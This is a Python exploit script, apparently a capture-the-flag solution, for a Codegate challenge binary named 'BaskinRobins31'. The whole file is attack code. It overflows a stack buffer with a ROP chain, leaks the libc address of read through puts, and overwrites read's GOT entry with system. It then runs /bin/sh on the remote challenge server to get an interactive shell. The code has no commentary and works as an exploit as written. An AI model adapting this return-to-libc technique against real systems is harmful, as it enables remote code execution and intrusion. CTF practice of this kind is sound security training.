from pwn import *

#s = remote('localhost', 3131)
s = remote("ch41l3ng3s.codegate.kr", 3131)
e = ELF('./BaskinRobins31')

puts_plt = e.plt['puts']
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']

cmd = '/bin/sh'

offset_read = 0xf7250
offset_system = 0x45390

prdir = 0x00400bc3
prdirsirdxr = 0x0040087a

#176+8
payload = ""
payload += 'A'*184

#Output read got
payload += p64(prdir)
payload += p64(read_got)
payload += p64(puts_plt)

#Input /bin/sh
payload += p64(prdirsirdxr)
payload += p64(0)
payload += p64(e.bss())
payload += p64(len(cmd))
payload += p64(read_plt)

#Input system -> read got
payload += p64(prdirsirdxr)
payload += p64(0)
payload += p64(read_got)
payload += p64(8)
payload += p64(read_plt)

#Call read_plt(system)
payload += p64(prdir)
payload += p64(e.bss())
payload += p64(read_plt)
print len(payload)

s.sendlineafter('(1-3)\n', payload)
s.recvuntil(':( \n')
sleep(0.1)

read_add = u64(s.recv(6) + '\x00\x00')
libc_base = read_add - offset_read
system_add = libc_base + offset_system

print "[+] read_add : " + hex(read_add)
print "[+] libc_base : " + hex(libc_base)
print "[+] system_add : " + hex(system_add)

sleep(0.1)
s.send(cmd)
sleep(0.1)
s.send(p64(system_add))

s.interactive()
